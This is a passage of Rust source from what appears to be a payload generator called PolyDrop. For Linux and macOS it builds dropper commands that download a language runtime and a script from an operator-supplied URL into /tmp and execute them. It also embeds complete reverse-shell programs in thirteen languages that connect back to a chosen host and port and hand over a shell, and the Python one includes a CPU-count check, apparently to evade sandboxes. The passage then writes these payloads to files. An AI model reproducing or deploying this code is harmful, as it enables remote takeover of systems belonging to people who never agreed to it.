        let dart_payload = format!("wget {} -O /tmp/dart.zip;unzip /tmp/dart.zip -d /tmp/dart-sdk/;chmod +x /tmp/dart-sdk/bin/dart;wget {}/{}.dart -O /tmp/{}.dart;/tmp/dart-sdk/bin/dart /tmp/{}.dart", &get_lang_dl("dart", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let d_payload = format!("wget {} -O /tmp/dmd.zip;unzip /tmp/dmd.zip -d /tmp/dmd2/;chmod +x /tmp/dmd2/linux/bin64/dmd;wget {}/{}.d -O /tmp/{}.d;/tmp/dmd2/linux/bin64/dmd /tmp/{}.d')\n", &get_lang_dl("dlang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let v_payload = format!("wget {} -O /tmp/v_linux.zip;unzip /tmp/v_linux.zip -d /tmp/v/;chmod +x /tmp/v/v;wget {}/{}.v -O /tmp/{}.v;/tmp/v/v run /tmp/{}.v", &get_lang_dl("vlang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let node_payload = format!("wget {} -O /tmp/node-v20.12.2-linux-x64.tar.gz;tar xzvf /tmp/node-v20.12.2-linux-x64.tar.gz -C /tmp;chmod +x /tmp/node-v20.12.2-linux-x64/bin/node;wget {}/{}.js -O /tmp/{}.js;/tmp/node-v20.12.2-linux-x64/bin/node /tmp/{}.js", &get_lang_dl("nodejs", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let bun_payload = format!("wget {} -O /tmp/bun.zip;unzip /tmp/bun.zip -d /tmp/bun-linux-x64/;chmod +x /tmp/bun-linux-x64/bun;wget {}/{}.tsx -O /tmp/{}.tsx;/tmp/bun-linux-x64/bun /tmp/{}.tsx", &get_lang_dl("bun", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let python_payload = format!(
            "wget {}/{}.py -O /tmp/{}.py;python3 /tmp/{}.py",
            &urlarg, &output, &output, &output
        );
        let fsharp_payload = format!("wget {} -O /tmp/dotnet-sdk-8.0.204-linux-x64.tar.gz;tar xzvf /tmp/dotnet-sdk-8.0.204-linux-x64.tar.gz -C /tmp;chmod +x /tmp/dotnet;wget {}/{}.fsx -O /tmp/{}.fsx;/tmp/dotnet/dotnet fsi /tmp/{}.fsx", &get_lang_dl("fsharp", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let deno_payload = format!("wget {} -O /tmp/deno-x86_64-unknown-linux-gnu.zip;unzip /tmp/deno-x86_64-unknown-linux-gnu.zip -d /tmp/deno-x86_64-unknown-linux-gnu/;chmod +x /tmp/deno-x86_64-unknown-linux-gnu/deno;wget {}/{}.tsx -O /tmp/{}.tsx;/tmp/deno-x86_64-unknown-linux-gnu/deno run --allow-net --allow-run /tmp/{}.ts", &get_lang_dl("deno", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let nix_payloads = payloads::Payloads::new(
            &tcl_payload,
            &php_payload,
            &crystal_payload,
            &julia_payload,
            &go_payload,
            &dart_payload,
            &d_payload,
            &v_payload,
            &node_payload,
            &bun_payload,
            &python_payload,
            &fsharp_payload,
            &deno_payload,
        );
        let tcl_revshell = format!("set chan [socket {} {}]\nputs $chan \"PolyDrop Connection from TCL Payload\"\nwhile {{1}} {{\n\tflush $chan\n\tputs $chan [puts \"Reverse Connection from TCL payload\" [gets $chan]]\n\tputs $chan [exec sh -c [gets $chan]]\n\tflush $chan\n}}", &lhostarg, &lportarg);
        let php_revshell = format!("<?php\nclass Shell {{\n\tprivate $addr = null;\n\tprivate $port = null;\n\tprivate $os= null;\n\tprivate $shell = null;\n\tprivate $descriptorspec = array(\n\t\t0 => array('pipe', 'r'),\n\t\t1 => array('pipe', 'w'),\n\t\t2 => array('pipe', 'w')\n\t);\n\tprivate $buffer = 1024;\n\tprivate $clen = 0;\n\tprivate $error = false;\n\tprivate $sdump = true;\n\tpublic function __construct($addr, $port) {{\n\t\t$this->addr = $addr;\n\t\t$this->port = $port;\n\t}}\n\tprivate function detect() {{\n\t\t$detected = true;\n\t\t$os = PHP_OS;\n\t\tif (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {{\n\t\t\t$this->os= 'LINUX';\n\t\t\t$this->shell = '/bin/sh';\n\t\t}} else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {{\n\t\t\t$this->os= 'WINDOWS';\n\t\t\t$this->shell = 'cmd.exe';\n\t\t}} else {{\n\t\t\t$detected = false;\n\t\t\techo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n\t\t}}\n\t\treturn $detected;\n\t}}\n\tprivate function daemonize() {{\n\t\t$exit = false;\n\t\tif (!function_exists('pcntl_fork')) {{\n\t\t\techo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n\t\t}} else if (($pid = @pcntl_fork()) < 0) {{\n\t\t\techo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n\t\t}} else if ($pid > 0) {{\n\t\t\t$exit = true;\n\t\t\techo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n\t\t}} else if (posix_setsid() < 0) {{\n\t\t\techo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n\t\t}} else {{\n\t\t\techo \"DAEMONIZE: Completed successfully!\\n\";\n\t\t}}\n\t\treturn $exit;\n\t}}\n\tprivate function settings() {{\n\t\t@error_reporting(0);\n\t\t@set_time_limit(0);\n\t\t@umask(0);\n\t}}\n\tprivate function dump($data) {{\n\t\tif ($this->sdump) {{\n\t\t\t$data = str_replace('<', '&lt;', $data);\n\t\t\t$data = str_replace('>', '&gt;', $data);\n\t\t\techo $data;\n\t\t}}\n\t}}\n\tprivate function read($stream, $name, $buffer) {{\n\t\tif (($data = @fread($stream, $buffer)) === false) {{\n\t\t\t$this->error = true;\n\t\t\techo \"STRM_ERROR: Cannot read from {{$name}}, script will now exit...\\n\";\n\t\t}}\n\t\treturn $data;\n\t}}\n\tprivate function write($stream, $name, $data) {{\n\t\tif (($bytes = @fwrite($stream, $data)) === false) {{\n\t\t\t$this->error = true;\n\t\t\techo \"STRM_ERROR: Cannot write to {{$name}}, script will now exit...\\n\";\n\t\t}}\n\t\treturn $bytes;\n\t}}\n\tprivate function rw($input, $output, $iname, $oname) {{\n\t\twhile (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {{\n\t\t\tif ($this->os === 'WINDOWS' && $oname === 'STDIN') {{ $this->clen += strlen($data); }}\n\t\t\t$this->dump($data);\n\t\t}}\n\t}}\n\tprivate function brw($input, $output, $iname, $oname) {{\n\t\t$size = fstat($input)['size'];\n\t\tif ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {{\n\t\t\twhile ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {{\n\t\t\t\t$this->clen -= $bytes;\n\t\t\t\t$size -= $bytes;\n\t\t\t}}\n\t\t}}\n\t\twhile ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {{\n\t\t\t$size -= $bytes;\n\t\t\t$this->dump($data);\n\t\t}}\n\t}}\n\tpublic function run() {{\n\t\tif ($this->detect() && !$this->daemonize()) {{\n\t\t\t$this->settings();\n\t\t\t$socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);\n\t\t\t@fwrite($socket, \"PolyDrop Connection from PHP Payload\n\");\n\t\t\tif (!$socket) {{\n\t\t\t\techo \"SOC_ERROR: {{$errno}}: {{$errstr}}\\n\";\n\t\t\t}} else {{\n\t\t\t\tstream_set_blocking($socket, false);\n\t\t\t\t$process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);\n\t\t\t\tif (!$process) {{\n\t\t\t\t\techo \"PROC_ERROR: Cannot start the shell\\n\";\n\t\t\t\t}} else {{\n\t\t\t\t\tforeach ($pipes as $pipe) {{\n\t\t\t\t\t\tstream_set_blocking($pipe, false);\n\t\t\t\t\t}}\n\t\t\t\t\t$status = proc_get_status($process);\n\t\t\t\t\t@fwrite($socket, \"SOCKET: Shell has connected! PID: {{$status['pid']}}\\n\");\n\t\t\t\t\tdo {{\n\t\t\t\t\t\t$status = proc_get_status($process);\n\t\t\t\t\t\tif (feof($socket)) {{\n\t\t\t\t\t\t\techo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;\n\t\t\t\t\t\t}} else if (feof($pipes[1]) || !$status['running']) {{\n\t\t\t\t\t\t\techo \"PROC_ERROR: Shell process has been terminated\\n\";break;\n\t\t\t\t\t\t}}\n\t\t\t\t\t\t$streams = array(\n\t\t\t\t\t\t\t'read' => array($socket, $pipes[1], $pipes[2]),\n\t\t\t\t\t\t\t'write' => null,\n\t\t\t\t\t\t\t'except' => null\n\t\t\t\t\t\t);\n\t\t\t\t\t\t$num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0);\n\t\t\t\t\t\tif ($num_changed_streams === false) {{\n\t\t\t\t\t\t\techo \"STRM_ERROR: stream_select() failed\\n\"; break;\n\t\t\t\t\t\t}} else if ($num_changed_streams > 0) {{\n\t\t\t\t\t\t\tif ($this->os === 'LINUX') {{\n\t\t\t\t\t\t\t\tif (in_array($socket , $streams['read'])) {{ $this->rw($socket , $pipes[0], 'SOCKET', 'STDIN' ); }}\n\t\t\t\t\t\t\t\tif (in_array($pipes[2], $streams['read'])) {{ $this->rw($pipes[2], $socket , 'STDERR', 'SOCKET'); }}\n\t\t\t\t\t\t\t\tif (in_array($pipes[1], $streams['read'])) {{ $this->rw($pipes[1], $socket , 'STDOUT', 'SOCKET'); }}\n\t\t\t\t\t\t\t}} else if ($this->os === 'WINDOWS') {{\n\t\t\t\t\t\t\t\tif (in_array($socket, $streams['read'])/*------*/) {{ $this->rw ($socket , $pipes[0], 'SOCKET', 'STDIN' ); }}\n\t\t\t\t\t\t\t\tif (($fstat = fstat($pipes[2])) && $fstat['size']) {{ $this->brw($pipes[2], $socket , 'STDERR', 'SOCKET'); }}\n\t\t\t\t\t\t\t\tif (($fstat = fstat($pipes[1])) && $fstat['size']) {{ $this->brw($pipes[1], $socket , 'STDOUT', 'SOCKET'); }}\n\t\t\t\t\t\t\t}}\n\t\t\t\t\t\t}}\n\t\t\t\t\t}} while (!$this->error);\n\t\t\t\t\tforeach ($pipes as $pipe) {{\n\t\t\t\t\t\tfclose($pipe);\n\t\t\t\t\t}}\n\t\t\t\t\tproc_close($process);\n\t\t\t\t}}\n\t\t\t\tfclose($socket);\n\t\t\t}}\n\t\t}}\n\t}}\n}}\necho '<pre>';\n$sh = new Shell('{}', {});\n$sh->run();\nunset($sh);\necho '</pre>';\n?>", &lhostarg, &lportarg);
        let crystal_revshell = format!("require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{}\", {})\nc.puts(\"PolyDrop Connection from Crystal Payload\")\nloop do\n\tm, l = c.receive\n\tp = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n\tc << p.output.gets_to_end\nend", &lhostarg, &lportarg);
        let julia_revshell = format!("using Sockets\n\nc = connect(\"{}\", {});\nmessage = \"PolyDrop Connection from Julia Payload\"\nmessage_bytes = string(message) |> x -> convert(Vector{{UInt8}}, x)\nwrite(c, message_bytes)\nwhile true\n\tcmd = readline(c, keep=true);\n\ttry\n\t\tprintln(c, read(`sh -c $cmd`, String));\n\tcatch e\n\t\tprint(c, e)\n\tend\nend", &lhostarg, &lportarg);
        let go_revshell = format!("package main;import\"os/exec\";import \"net\";import \"fmt\";func main(){{c,_:=net.Dial(\"tcp\",\"{}:{}\");message := \"PolyDrop Connection from Golang Payload\\n\";_, err := fmt.Fprintf(c, message);if err != nil {{fmt.Printf(\"Error sending message: %v\\n\", err);return}};cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}", &lhostarg, &lportarg);
        let dart_revshell = format!("import 'dart:io';\nimport 'dart:convert';\n\nmain() {{\n\tSocket.connect(\"{}\", {}).then((socket) {{\n\t\tvar message = \"PolyDrop Connection from Dart Payload\n\";var messageBytes = utf8.encode(message);socket.add(messageBytes);socket.listen((data) {{\n\t\t\tProcess.start('sh', []).then((Process process) {{\n\t\t\t\tprocess.stdin.writeln(new String.fromCharCodes(data).trim());\n\t\t\t\tprocess.stdout\n\t\t\t\t\t.transform(utf8.decoder)\n\t\t\t\t\t.listen((output) {{ socket.write(output); }});\n\t\t\t}});\n\t\t}},\n\t\tonDone: () {{\n\t\t\tsocket.destroy();\n\t\t}});\n\t}});\n}}", &lhostarg, &lportarg);
        let d_revshell = format!("import std.process, std.socket, std.conv;\n\nvoid main()\n{{\n\tSocket sock = new TcpSocket(new InternetAddress(\"{}\", {}));\n\tstring message = \"PolyDrop Connection from D-Lang Payload\n\";auto messageBytes = message.toUTF8();sock.send(messageBytes);\n\twhile (true)\n\t{{\n\t\tchar[] line;\n\t\tchar[1] buf;\n\t\twhile(sock.receive(buf))\n\t\t{{\n\t\t\tline ~= buf;\n\t\t\tif (buf[0] == '\\n')\n\t\t\t\tbreak;\n\t\t}}\n\t\tif (!line.length)\n\t\t\tbreak;\n\n\t\tauto os = executeShell(line);\n\t\tsock.send(os.output);\n\t}}\n}}", &lhostarg, &lportarg);
        let v_revshell = format!("module main\n\nimport net\nimport io\nimport os\n\nfn exec(path string) string {{\n\tmut out := ''\n\tmut line := ''\n\tmut cmd := os.Command{{\n\t\tpath: path\n\t}}\n\tcmd.start() or {{ panic(err) }}\n\n\tfor {{\n\t\tline = cmd.read_line()\n\t\tout += line + '\\n'\n\t\tif cmd.eof {{\n\t\t\treturn out\n\t\t}}\n\t}}\n\treturn out\n}}\n\nfn main() {{\n\tmut conn := net.dial_tcp('{}:{}')!\n\tmessage := \"PolyDrop Connection from V-Lang Payload\\n\";message_bytes := message.bytes();conn.write(message_bytes)!\n\tmut reader := io.new_buffered_reader(reader: conn)\n\tfor {{\n\t\tresult := reader.read_line() or {{ return }}\n\t\tconn.write_string(exec(result) + '\n') or {{ return }}\n\t}}\n}}", &lhostarg, &lportarg);
        let node_revshell = format!("(function(){{\n\tvar net = require(\"net\"),\n\t\tcp = require(\"child_process\"),\n\t\tsh = cp.spawn(\"sh\", []);\n\tvar client = new net.Socket();\n\tclient.connect({}, \"{}\", function(){{\n\t\tconst message = \"PolyDrop Connection from Node.js Payload\\n\";client.write(message);\n\t\tclient.pipe(sh.stdin);\n\t\tsh.stdout.pipe(client);\n\t\tsh.stderr.pipe(client);\n\t}});\n\treturn /a/;\n}})();", &lportarg, &lhostarg);
        let bun_revshell = format!("const net = require('net');\nconst {{ exec }} = require('child_process');\n\nconst IP = '{}';\nconst PORT = {};\n\nconst client = new net.Socket();\n\nclient.connect(PORT, IP, () => {{\n\tconsole.log('Connected to server');\n\tclient.write('PolyDrop Connection from Bun Payload\\n');\n}});\n\nclient.on('data', (data) => {{\n\texec(data.toString(), (error, stdout, stderr) => {{\n\t\tif (error) {{\n\t\t\tclient.write(`Error: ${{error.message}}\n`);\n\t\t\treturn;\n\t\t}}\n\t\tif (stderr) {{\n\t\t\tclient.write(`Stderr: ${{stderr}}\n`);\n\t\t\treturn;\n\t\t}}\n\t\tclient.write(stdout);\n\t}});\n}});\n\nclient.on('close', () => {{\n\tconsole.log('Connection closed');\n\tprocess.exit(0);\n}});", &lhostarg, &lportarg);
        let python_revshell = format!("import os\nimport socket\nimport subprocess\n\nif os.cpu_count() <= 2:\n\tquit()\n\nHOST = '{}'\nPORT = {}\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\nmessage = \"PolyDrop Connection from Python Payload\\n\";s.sendall(message.encode())\n\nwhile 1:\n\ttry:\n\t\ts.send(str.encode(os.getcwd() + \"> \"))\n\t\tdata = s.recv(1024).decode(\"UTF-8\")\n\t\tdata = data.strip('\\n')\n\t\tif data == \"quit\": \n\t\t\tbreak\n\t\tif data[:2] == \"cd\":\n\t\t\tos.chdir(data[3:])\n\t\tif len(data) > 0:\n\t\t\tproc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n\t\t\tstdout_value = proc.stdout.read() + proc.stderr.read()\n\t\t\toutput_str = str(stdout_value, \"UTF-8\")\n\t\t\ts.send(str.encode(\"\\n\" + output_str))\n\texcept Exception as e:\n\t\tcontinue\n\ns.close()", &lhostarg, &lportarg);
        let fsharp_revshell = format!("open System\nopen System.Net\nopen System.Diagnostics\n\nlet rec asyncStdin (stream: System.Net.Sockets.NetworkStream, cmd: Process) =\n\tasync {{\n\t\tlet input = stream.ReadByte() |> Char.ConvertFromUtf32\n\t\tcmd.StandardInput.Write(input)\n\n\t\treturn! asyncStdin (stream, cmd)\n\t}}\n\nlet rec asyncStdout (stream: System.Net.Sockets.NetworkStream, cmd: Process) =\n\tasync {{\n\t\tlet output = cmd.StandardOutput.Read() |> Char.ConvertFromUtf32\n\t\tlet outbyte = System.Text.Encoding.UTF32.GetBytes(output)\n\t\tstream.Write(outbyte, 0, outbyte.Length)\n\n\t\treturn! asyncStdout (stream, cmd)\n\t}}\n\nlet main =\n\tlet client = new System.Net.Sockets.TcpClient()\n\n\tclient.Connect(\"{}\", {})\n\n\tlet stream = client.GetStream()\n\tlet message = \"PolyDrop Connection from F# Payload\\n\";let messageBytes = Encoding.UTF8.GetBytes(message);stream.Write(messageBytes, 0, messageBytes.Length)\n\tlet procStartInfo = ProcessStartInfo (\n\t\tFileName = \"/bin/sh\",\n\t\tRedirectStandardInput = true,\n\t\tRedirectStandardOutput = true,\n\t\tRedirectStandardError = true,\n\t\tUseShellExecute = false,\n\t\tCreateNoWindow = true\n\t)\n\n\tlet cmd = new Process(StartInfo = procStartInfo)\n\tlet err = cmd.Start()\n\n\tasyncStdin (stream, cmd) |> Async.Start\n\tasyncStdout (stream, cmd) |> Async.RunSynchronously\n\n\tstream.Flush()\n\n\tSystem.Threading.Thread.Sleep(TimeSpan.FromSeconds(30.0))\n\nmain", &lhostarg, &lportarg);
        let deno_revshell = format!("const IP = \"{}\";\nconst PORT = {};\n\nasync function connect(ip: string, port: number) {{\n\tconst conn = await Deno.connect({{ hostname: ip, port: port }});\n\tconsole.log(`Connected to ${{ip}}:${{port}}`);\n\n\tawait conn.write(new TextEncoder().encode(\"PolyDrop Connection from Deno Payload\\n\"));\n\n\tconst buffer = new Uint8Array(1024);\n\twhile (true) {{\n\t\tconst n = await conn.read(buffer);\n\t\tif (n === null) break;\n\t\tconst command = new TextDecoder().decode(buffer.subarray(0, n)).trim();\n\t\tconsole.log(`Received: ${{command}}`);\n\n\t\ttry {{\n\t\t\tconst process = Deno.run({{\n\t\t\t\tcmd: [\"sh\", \"-i\", command],\n\t\t\t\tstdout: \"piped\",\n\t\t\t\tstderr: \"piped\",\n\t\t\t}});\n\n\t\t\tconst output = await process.output();\n\t\t\tconst error = await process.stderrOutput();\n\n\t\t\tconst combinedOutput = new Uint8Array([...output, ...error]);\n\t\t\tawait conn.write(combinedOutput);\n\n\t\t\tprocess.close();\n\t\t}} catch (err) {{\n\t\t\tawait conn.write(new TextEncoder().encode(`Error: ${{err.message}}\n`));\n\t\t}}\n\t}}\n\n\tconn.close();\n}}\n\nconnect(IP, PORT);", &lhostarg, &lportarg);
        let reverse_shell = payloads::Codex::new(
            &tcl_revshell,
            &php_revshell,
            &crystal_revshell,
            &julia_revshell,
            &go_revshell,
            &dart_revshell,
            &d_revshell,
            &v_revshell,
            &node_revshell,
            &bun_revshell,
            &python_revshell,
            &fsharp_revshell,
            &deno_revshell,
        );
        let p_res = if language == "tcl" {
            nix_payloads.tcl_payload()
        } else if language == "php" {
            nix_payloads.php_payload()
        } else if language == "crystal" {
            nix_payloads.crystal_payload()
        } else if language == "julia" {
            nix_payloads.julia_payload()
        } else if language == "golang" {
            nix_payloads.go_payload()
        } else if language == "dart" {
            nix_payloads.dart_payload()
        } else if language == "dlang" {
            nix_payloads.d_payload()
        } else if language == "vlang" {
            nix_payloads.v_payload()
        } else if language == "nodejs" {
            nix_payloads.node_payload()
        } else if language == "bun" {
            nix_payloads.bun_payload()
        } else if language == "python" {
            nix_payloads.python_payload()
        } else if language == "fsharp" {
            nix_payloads.fsharp_payload()
        } else if language == "deno" {
            nix_payloads.deno_payload()
        } else if language == "empty" {
            "Building payload for every language...".to_string()
        } else {
            arguments::getargs()
        }
        .to_string();

        let p_shell = if language == "tcl" {
            reverse_shell.tcl_revshell()
        } else if language == "php" {
            reverse_shell.php_revshell()
        } else if language == "crystal" {
            reverse_shell.crystal_revshell()
        } else if language == "julia" {
            reverse_shell.julia_revshell()
        } else if language == "golang" {
            reverse_shell.go_revshell()
        } else if language == "dart" {
            reverse_shell.dart_revshell()
        } else if language == "dlang" {
            reverse_shell.d_revshell()
        } else if language == "vlang" {
            reverse_shell.v_revshell()
        } else if language == "nodejs" {
            reverse_shell.node_revshell()
        } else if language == "bun" {
            reverse_shell.bun_revshell()
        } else if language == "python" {
            reverse_shell.python_revshell()
        } else if language == "fsharp" {
            reverse_shell.f_revshell()
        } else if language == "deno" {
            reverse_shell.deno_revshell()
        } else if language == "empty" {
            "Building payload for every language...".to_string()
        } else {
            arguments::getargs()
        }
        .to_string();

        let p_ext = if language == "tcl" {
            ".tcl".to_string()
        } else if language == "php" {
            ".php".to_string()
        } else if language == "crystal" {
            ".cr".to_string()
        } else if language == "julia" {
            ".jl".to_string()
        } else if language == "golang" {
            ".go".to_string()
        } else if language == "dart" {
            ".dart".to_string()
        } else if language == "dlang" {
            ".d".to_string()
        } else if language == "vlang" {
            ".v".to_string()
        } else if language == "nodejs" {
            ".js".to_string()
        } else if language == "bun" {
            ".tsx".to_string()
        } else if language == "python" {
            ".py".to_string()
        } else if language == "fsharp" {
            ".fsx".to_string()
        } else if language == "deno" {
            ".ts".to_string()
        } else if language == "empty" {
            "Building payload for every language...".to_string()
        } else {
            arguments::getargs()
        }
        .to_string();

        let ext = if payload == "pwsh" || payload == "PowerShell" || payload == "powershell" {
            ".ps1"
        } else {
            ".sh"
        }
        .to_string();
        let outfile = output.to_string() + &ext;
        let revfile = output.to_string() + &p_ext;
        if allarg == "true" {
            for payload in [
                &nix_payloads.tcl_payload(),
                &nix_payloads.php_payload(),
                &nix_payloads.crystal_payload(),
                &nix_payloads.julia_payload(),
                &nix_payloads.go_payload(),
                &nix_payloads.dart_payload(),
                &nix_payloads.d_payload(),
                &nix_payloads.v_payload(),
                &nix_payloads.node_payload(),
                &nix_payloads.bun_payload(),
                &nix_payloads.python_payload(),
                &nix_payloads.fsharp_payload(),
                &nix_payloads.deno_payload(),
            ]
            .iter()
            {
                //println!("{}", payload);
                // Open a file with append option
                let mut data_file = OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&outfile)
                    .expect("cannot open file");

                // Write to a file
                data_file
                    .write_all(payload.as_bytes())
                    .expect("write failed");
            }
            let source_array = [
                &reverse_shell.tcl_revshell(),
                &reverse_shell.php_revshell(),
                &reverse_shell.crystal_revshell(),
                &reverse_shell.julia_revshell(),
                &reverse_shell.go_revshell(),
                &reverse_shell.dart_revshell(),
                &reverse_shell.d_revshell(),
                &reverse_shell.v_revshell(),
                &reverse_shell.node_revshell(),
                &reverse_shell.bun_revshell(),
                &reverse_shell.python_revshell(),
                &reverse_shell.f_revshell(),
                &reverse_shell.deno_revshell(),
            ];
            let ext_array = [
                ".tcl".to_string(),
                ".php".to_string(),
                ".cr".to_string(),
                ".jl".to_string(),
                ".go".to_string(),
                ".dart".to_string(),
                ".d".to_string(),
                ".v".to_string(),
                ".js".to_string(),
                ".tsx".to_string(),
                ".py".to_string(),
                ".fsx".to_string(),
                ".ts".to_string(),
            ];
            for (revcode, revext) in source_array.iter().zip(ext_array.iter()) {
                let payloadfile = output.to_string() + &revext;
                let mut revshell_source =
                    std::fs::File::create(payloadfile).expect("create failed");
                revshell_source
                    .write_all(revcode.as_bytes())
                    .expect("write failed");
            }
        } else {
            let mut payload_main = std::fs::File::create(outfile).expect("create failed");
            payload_main
                .write_all(p_res.as_bytes())
                .expect("write failed");
            let mut revshell_source = std::fs::File::create(revfile).expect("create failed");
            revshell_source
                .write_all(p_shell.as_bytes())
                .expect("write failed");
        }
    } else if platform == "macos" {
        let tcl_payload = format!("wget {} -O /tmp/tclkit8;chmod +x /tmp/tclkit8;wget {}/{}.tcl -O /tmp/{}.tcl;/tmp/tclkit8 /tmp/{}.tcl", &get_lang_dl("tcl", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let php_payload = format!("wget {} -O /tmp/php8.tar.gz;tar xzvf /tmp/php8.tar.gz -C /tmp;chmod +x /tmp/php;wget {}/{}.php -O /tmp/{}.php;/tmp/php /tmp/{}.php", &get_lang_dl("php", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let crystal_payload = format!("wget {} -O /tmp/crystal.tar.gz;tar xzvf /tmp/crystal.tar.gz -C /tmp;chmod +x /tmp/crystal-1.12.1-1/bin/crystal;wget {}/{}.cr -O /tmp/{}.cr;/tmp/crystal-1.12.1-1/bin/crystal run /tmp/{}.cr", &get_lang_dl("crystal", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let julia_payload = format!("wget {} -O /tmp/julia.tar.gz;tar xzvf /tmp/julia.tar.gz -C /tmp;chmod +x /tmp/julia-1.10.3/bin/julia;wget {}/{}.jl -O /tmp/{}.jl;/tmp/julia-1.10.3/bin/julia /tmp/{}.jl", &get_lang_dl("julia", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let go_payload = format!("wget {} -O /tmp/go.tar.gz;tar xzvf /tmp/go.tar.gz -C /tmp;chmod +x /tmp/go/bin/go;wget {}/{}.go -O /tmp/{}.go;/tmp/go/bin/go run /tmp/{}.go", &get_lang_dl("golang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let dart_payload = format!("wget {} -O /tmp/dart.zip;unzip /tmp/dart.zip -d /tmp/dart-sdk/;chmod +x /tmp/dart-sdk/bin/dart;wget {}/{}.dart -O /tmp/{}.dart;/tmp/dart-sdk/bin/dart /tmp/{}.dart", &get_lang_dl("dart", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let d_payload = format!("wget {} -O /tmp/dmd.zip;unzip /tmp/dmd.zip -d /tmp/dmd2/;chmod +x /tmp/dmd2/osx/bin/dmd;wget {}/{}.d -O /tmp/{}.d;/tmp/dmd2/osx/bin/dmd /tmp/{}.d", &get_lang_dl("dlang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let v_payload = format!("wget {} -O /tmp/v_macos_x86_64.zip;unzip /tmp/v_macos_x86_64.zip -d /tmp/v/;chmod +x /tmp/v/v;wget {}/{}.v -O /tmp/{}.v;/tmp/v/v /tmp/{}.v", &get_lang_dl("vlang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let node_payload = format!("wget {} -O /tmp/node-v20.12.2-darwin-x64.tar.gz;tar xzvf /tmp/node-v20.12.2-darwin-x64.tar.gz -C /tmp;chmod +x /tmp/node-v20.12.2-darwin-x64/bin/node;wget {}/{}.js -O /tmp/{}.js;/tmp/node-v20.12.2-darwin-x64/bin/node /tmp/{}.js", &get_lang_dl("nodejs", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let bun_payload = format!("wget {} -O /tmp/bun.zip;unzip /tmp/bun.zip -d /tmp/bun-linux-x64/;chmod +x /tmp/bun-linux-x64/bun;wget {}/{}.tsx -O /tmp/{}.tsx;/tmp/bun-linux-x64/bun /tmp/{}.tsx", &get_lang_dl("bun", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let python_payload = format!(
            "wget {}/{}.py -O /tmp/{}.py;python3 /tmp/{}.py",
            &urlarg, &output, &output, &output
        );
        let fsharp_payload = format!("wget {} -O /tmp/dotnet-sdk-8.0.204-osx-x64.tar.gz;tar xzvf /tmp/dotnet-sdk-8.0.204-osx-x64.tar.gz -C /tmp;chmod +x /tmp/dotnet/dotnet;wget {}/{}.fsx -O /tmp/{}.fsx;/tmp/dotnet fsi /tmp/{}.fsx", &get_lang_dl("fsharp", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let deno_payload = format!("wget {} -O /tmp/deno-x86_64-apple-darwin.zip;unzip /tmp/deno-x86_64-apple-darwin.zip -d /tmp/deno-x86_64-apple-darwin/;chmod +x /tmp/deno-x86_64-apple-darwin/deno;wget {}/{}.tsx -O /tmp/{}.tsx;/tmp/deno-x86_64-apple-darwin/deno run --allow-net --allow-run /tmp/{}.ts", &get_lang_dl("deno", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let mac_payloads = payloads::Payloads::new(
            &tcl_payload,
            &php_payload,
            &crystal_payload,
            &julia_payload,
            &go_payload,
            &dart_payload,
            &d_payload,
            &v_payload,
            &node_payload,
            &bun_payload,
            &python_payload,
            &fsharp_payload,
            &deno_payload,
        );
        let tcl_revshell = format!("set chan [socket {} {}]\nwhile {{1}} {{\n\tflush $chan\n\tputs $chan [exec sh -c [gets $chan]]\n\tflush $chan\n}}", &lhostarg, &lportarg);
